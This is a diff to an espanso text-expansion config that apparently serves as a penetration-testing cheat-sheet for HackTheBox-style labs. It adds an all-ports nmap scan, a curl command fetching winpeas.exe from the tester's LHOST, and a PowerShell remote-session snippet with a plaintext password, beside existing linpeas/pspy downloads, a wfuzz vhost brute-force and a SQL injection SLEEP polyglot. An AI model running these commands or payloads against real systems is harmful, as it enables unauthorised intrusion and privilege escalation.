@@ -18,10 +18,15 @@ matches:
   # Simple text replacement
   - trigger: ":lhost"
     replace: "{{LHOST}}"
+
   - trigger: ":lport"
     replace: "{{LPORT}}"
+
   - trigger: ":rhost"
     replace: "{{RHOST}}"
+
+  - trigger: ":help"
+    replace: "code ~/.config/espanso/match/base.yml"
 
   #### Others
   - trigger: ":msfconsole"
@@ -39,6 +44,9 @@ matches:
   - trigger: ":nmap_udp"
     replace: "sudo nmap -sU -oA nmap/nmap_udp"
 
+  - trigger: ":nmap_allports"
+    replace: "sudo nmap -sC -sV -p- -oA nmap/nmap_allports"
+
   - trigger: ":scan_wfuzz"
     replace: 'sudo wfuzz -c -f wfuzz.vhosts -Z -w gobuster/best-dns-wordlist.txt -u "http://DNS.htb" -H "Host: FUZZ.DNS.htb"'
 
@@ -48,8 +56,15 @@ matches:
   - trigger: ":curl_linpeas"
     replace: curl -o linpeas.sh http://{{LHOST}}/linpeas.sh
 
+  - trigger: ":curl_winpeas"
+    replace: curl -o winpeas.exe http://{{LHOST}}/winpeas.exe
+
   - trigger: ":curl_pspy"
     replace: curl -o pspy32 http://{{LHOST}}/pspy32
+
+  - trigger: ":ps_remotesession"
+    replace: '$password = ConvertTo-SecureString "plaintext_password" -AsPlainText -Force\n$user = "DOMAIN\\USERNAME"\n$cred = New-Object System.Management.Automation.PSCredential($user,$password)\nEnter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate'
+
   #### SQL Injection
   - trigger: ":sqli_poly"
     replace: 'SLEEP(1) /*'' or SLEEP(1) or ''" or SLEEP(1) or "*/'
@@ -149,5 +164,3 @@ matches:
         type: date
         params:
           format: "%m/%d/%Y"
-
-  # And much more! For more information, visit the docs: https://espanso.org/docs/
